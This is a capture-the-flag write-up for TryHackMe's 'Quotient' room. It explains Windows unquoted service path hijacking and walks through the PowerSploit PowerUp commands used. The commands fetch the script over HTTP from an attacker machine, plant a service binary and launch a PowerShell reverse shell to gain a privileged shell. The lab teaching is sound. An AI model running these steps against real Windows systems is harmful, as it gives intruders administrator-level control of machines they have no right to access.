---
title: Quotient - Windows Unquoted Service Path Exploitation
---

**Description: Exploiting a Windows unquoted service path vulnerability to escalate our privileges**
TryHackMe Quotient Without MsfVenom - https://tryhackme.com/room/quotient

This room on TryHackMe involves exploiting an [unquoted service path vulnerability](https://attack.mitre.org/techniques/T1574/009/) to escalate our privileges and read the flag located on the Administrator's desktop. 

Let's quickly go over what a unquoted service path vulnerability is and how to exploit it.

An **unquoted service path** vulnerability occurs when there's a service whose service path contains spaces and it isn't enclosed with quotation marks. This leads to Windows interpreting the file path incorrectly which can lead to Windows executing our own executable. Windows will read the service path until a space is reached, then it will append `.exe` to the end of the path & search for that binary. If it is not found, it continues to do this until the executable is found.

So for example, say our service path is `C:\Program Files\Custom Service\My Service\service.exe`

* Windows will first look into the `C:\` drive for `Program.exe`. If it finds it, it'll execute it. If it doesn't find it, it moves on to the next path.
* Windows then looks for `C:\Program Files\Custom.exe`. If it finds it, it'll execute it. If it doesn't find it, it moves on to the next path.
* Windows then looks for `C:\Program Files\Custom Service\My.exe`. If it finds it, it'll execute it. If it doesn't find it, it moves on to the next path
* Windows will finally look for `C:\Program Files\Custom Service\My Service\service.exe`

Now if the service is running with escalated privileges, such as system, then we can escalate our privileges by placing an executable in a path we have permissions to write to & specify the name of the executable that Windows will search for.

So let's say we can write to the `Custom Service` folder and we know that Windows will search for `My.exe`. We can create a file named `My.exe` & place it into `Custom Service`. If Windows doesn't find the other previous binaries, it'll find & execute ours as a privileged user.

We could manually discover any services that have service paths that contain spaces & aren't enclosed within quotation marks, or we could choose to use a tool such as [Powersploit, specifically the PowerUp module](https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc).

I chose to use PowerSploit in order to better familiarize myself with the functions and their uses.

First, we must get the `PowerUp.ps1` script onto the Windows machine. Since the machine doesn't have internet access, I downloaded it onto my local machine first, then started a Python simple HTTP server by running:

`python3 -m http.server`

Then using Powershell on the Windows machine to download it from my local machine by running:

`Invoke-WebRequest -Uri http://youripaddresshere:8000/powerup.ps1 -OutFile powerup.ps1`

After it's been downloaded, we must load the script as a module so that we can call its functions directly from the PowerShell command-line. We do this by running:

`. .\powerup.ps1`

That should return no output, and now we should be able to use the functions that `PowerUp` provides!

We can test this by running `Get-UnquotedService` which will return all services that contain a space in their name & aren't enclosed with quotes:

![](https://i.imgur.com/kMyxXnK.png)

As you can see, we have a service that has been returned with the name `Development Service`. The reason that 3 different entries for this service were returned is because they have different modifiable paths.

I believe that the modifiable path details to us the permissions we have on certain sections of the path to the service. 

* *NOTE: Notice that it returned the `C:\` path as being modifiable, but In order to create files within this path, you must already have admin privileges, so this can be considered a false positive*

The modifiable path we'll be targeting is `C:\Program Files\Development Files` and we'll be dropping an executable named `Devservice.exe` within this path.

`Get-UnquotedService` also returns 2 other important pieces of data:

1. `AbuseFunction` which tells us that we can use the `Write-ServiceBinary` function to exploit the unquoted service path vulnerability
2. `CanRestart` which tells us whether or not we can manually restart the service. In this case, we can't which means we'll have to restart the machine in order to essentially restart the service

By default, if you run the `Write-ServiceBinary` function & provide the `-Name` & `-Path` arguments, it'll generate an executable & place it into the specified path. Then when the service is restarted, the executable will, by default, add the user `john` into the local admins group with a password `Password123!`

You can modify the username & password by specifying the `-UserName` & `-Password` arguments.

In this case, I chose not to add a new local user & instead execute a custom command using the `-Command` argument. The custom command I'll be executing is a Powershell reverse shell stored in a `.ps1` file. I'll be executing it by passing the `powershell.exe C:\Users\Sage\ps1liner.ps1` command to the `-Command` argument.

The full command would be:

`Write-ServiceBinary -Name "Development Service" -Path "C:\Program Files\Development Files\Devservice.exe" -Command "powershell.exe C:\Users\Sage\ps1liner.ps1"`

![](https://i.imgur.com/JgLVg4k.png)

After you've run that and the executable has been dropped in the specified path, you can start your listener & restart the machine, then wait for your connection.

After a few moments...

![](https://i.imgur.com/3PuY85S.png)

We got a privileged shell!
